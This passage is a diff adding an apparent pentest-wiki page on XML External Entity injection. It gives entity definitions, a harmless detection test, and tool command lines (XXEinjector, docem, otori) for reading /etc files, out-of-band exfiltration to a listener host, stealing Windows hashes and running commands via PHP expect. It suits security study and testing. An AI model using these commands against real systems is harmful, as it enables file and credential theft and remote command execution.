@@ -1,0 +1,2117 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about xml external entity injection techniques, methods, payloads, how/why/when they work.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="XML eXternal Entity Injection" />
+<meta property="og:description" content="All about xml external entity injection techniques, methods, payloads, how/why/when they work." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/xxe_injection/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>XML eXternal Entity Injection | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="active">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>XML eXternal Entity Injection</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#xml-external-entity">XML External Entity</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#detect-the-vulnerability">Detect the vulnerability</a></li>
+        <li><a href="#exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</a>
+          <ul>
+            <li><a href="#classic-xxe">Classic XXE</a></li>
+            <li><a href="#classic-xxe-base64-encoded">Classic XXE Base64 encoded</a></li>
+            <li><a href="#php-wrapper-inside-xxe">PHP Wrapper inside XXE</a></li>
+            <li><a href="#xinclude-attacks">XInclude attacks</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploiting-xxe-to-perform-ssrf-attacks">Exploiting XXE to perform SSRF attacks</a></li>
+        <li><a href="#exploiting-xxe-to-perform-a-deny-of-service">Exploiting XXE to perform a deny of service</a>
+          <ul>
+            <li><a href="#billion-laugh-attack">Billion Laugh Attack</a></li>
+            <li><a href="#yaml-attack">Yaml attack</a></li>
+          </ul>
+        </li>
+        <li><a href="#error-based-xxe">Error Based XXE</a></li>
+        <li><a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</a>
+          <ul>
+            <li><a href="#blind-xxe">Blind XXE</a></li>
+            <li><a href="#xxe-oob-attack-yunusov-2013">XXE OOB Attack (Yunusov, 2013)</a></li>
+            <li><a href="#xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</a></li>
+            <li><a href="#xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</a></li>
+          </ul>
+        </li>
+        <li><a href="#xxe-with-local-dtd">XXE with local DTD</a></li>
+        <li><a href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</a>
+          <ul>
+            <li><a href="#disclose-local-file">Disclose local file</a></li>
+            <li><a href="#disclose-http-response">Disclose HTTP Response:</a></li>
+          </ul>
+        </li>
+        <li><a href="#xxe-in-exotic-files">XXE in exotic files</a>
+          <ul>
+            <li><a href="#xxe-inside-svg">XXE inside SVG</a></li>
+            <li><a href="#xxe-inside-soap">XXE inside SOAP</a></li>
+            <li><a href="#xxe-inside-docx-file">XXE inside DOCX file</a></li>
+            <li><a href="#xxe-inside-xlsx-file">XXE inside XLSX file</a></li>
+            <li><a href="#xxe-inside-dtd-file">XXE inside DTD file</a></li>
+            <li><a href="#xxe-waf-bypass-via-convert-character-encoding">XXE WAF Bypass via convert character encoding</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="xml-external-entity">
+  XML External Entity
+  <a class="anchor" href="#xml-external-entity">#</a>
+</h1>
+<blockquote>
+<p>An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.</p>
+</blockquote>
+<p><strong>Internal Entity</strong>: If an entity is declared within a DTD it is called as internal entity. <br>
+Syntax: <code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p>
+<p><strong>External Entity</strong>: If an entity is declared outside a DTD it is called as external entity. Identified by <code>SYSTEM</code>. <br>
+Syntax: <code>&lt;!ENTITY entity_name SYSTEM &quot;entity_value&quot;&gt;</code></p>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/staaldraad/xxeserv">xxeftp</a> - A mini webserver with FTP support for XXE payloads
+<pre tabindex="0"><code>sudo ./xxeftp -uno 443
+./xxeftp -w -wps 5555
+</code></pre></li>
+<li>
+  <a href="https://github.com/lc/230-OOB">230-OOB</a> - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via 
+  <a href="http://xxe.sh/">http://xxe.sh/</a>
+<pre tabindex="0"><code>$ python3 230.py 2121
+</code></pre></li>
+<li>
+  <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Enumerating /etc directory in HTTPS application:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --path<span style="color:#f92672">=</span>/etc --file<span style="color:#f92672">=</span>/tmp/req.txt --ssl
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerating /etc directory using gopher for OOB method:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --path<span style="color:#f92672">=</span>/etc --file<span style="color:#f92672">=</span>/tmp/req.txt --oob<span style="color:#f92672">=</span>gopher
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Second order exploitation:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --path<span style="color:#f92672">=</span>/etc --file<span style="color:#f92672">=</span>/tmp/vulnreq.txt --2ndfile<span style="color:#f92672">=</span>/tmp/2ndreq.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bruteforcing files using HTTP out of band method and netdoc protocol:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --brute<span style="color:#f92672">=</span>/tmp/filenames.txt --file<span style="color:#f92672">=</span>/tmp/req.txt --oob<span style="color:#f92672">=</span>http --netdoc
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerating using direct exploitation:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --file<span style="color:#f92672">=</span>/tmp/req.txt --path<span style="color:#f92672">=</span>/etc --direct<span style="color:#f92672">=</span>UNIQUEMARK
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerating unfiltered ports:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --file<span style="color:#f92672">=</span>/tmp/req.txt --enumports<span style="color:#f92672">=</span>all
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stealing Windows hashes:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --file<span style="color:#f92672">=</span>/tmp/req.txt --hashes
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Uploading files using Java jar:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --file<span style="color:#f92672">=</span>/tmp/req.txt --upload<span style="color:#f92672">=</span>/tmp/uploadfile.pdf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Executing system commands using PHP expect:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --file<span style="color:#f92672">=</span>/tmp/req.txt --oob<span style="color:#f92672">=</span>http --phpfilter --expect<span style="color:#f92672">=</span>ls
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Testing for XSLT injection:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --host<span style="color:#f92672">=</span>192.168.0.2 --file<span style="color:#f92672">=</span>/tmp/req.txt --xslt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Log requests only:</span>
+</span></span><span style="display:flex;"><span>ruby XXEinjector.rb --logger --oob<span style="color:#f92672">=</span>http --output<span style="color:#f92672">=</span>/tmp/out.txt
+</span></span></code></pre></div></li>
+<li>
+  <a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a> - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
+<pre tabindex="0"><code>ruby server.rb
+</code></pre></li>
+<li>
+  <a href="https://github.com/whitel1st/docem">docem</a> - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
+<pre tabindex="0"><code>./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
+./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
+./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
+./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
+</code></pre></li>
+<li>
+  <a href="http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html">otori</a> - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
+<pre tabindex="0"><code>python ./otori.py --clone --module &#34;G-XXE-Basic&#34; --singleuri &#34;file:///etc/passwd&#34; --module-options &#34;TEMPLATEFILE&#34; &#34;TARGETURL&#34; &#34;BASE64ENCODE&#34; &#34;DOCTYPE&#34; &#34;XMLTAG&#34; --outputbase &#34;./output-generic-solr&#34; --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
+</code></pre></li>
+</ul>
+<h2 id="detect-the-vulnerability">
+  Detect the vulnerability
+  <a class="anchor" href="#detect-the-vulnerability">#</a>
+</h2>
+<p>Basic entity test, when the XML parser parses the external entities the result should contain &ldquo;John&rdquo; in <code>firstName</code> and &ldquo;Doe&rdquo; in <code>lastName</code>. Entities are defined inside the <code>DOCTYPE</code> element.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example &#34;Doe&#34;&gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;userInfo&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;firstName&gt;</span>John<span style="color:#f92672">&lt;/firstName&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;lastName&gt;</span>&amp;example;<span style="color:#f92672">&lt;/lastName&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;/userInfo&gt;</span>
+</span></span></code></pre></div><p>It might help to set the <code>Content-Type: application/xml</code> in the request when sending XML payload to the server.</p>
+<h2 id="exploiting-xxe-to-retrieve-files">
+  Exploiting XXE to retrieve files
+  <a class="anchor" href="#exploiting-xxe-to-retrieve-files">#</a>
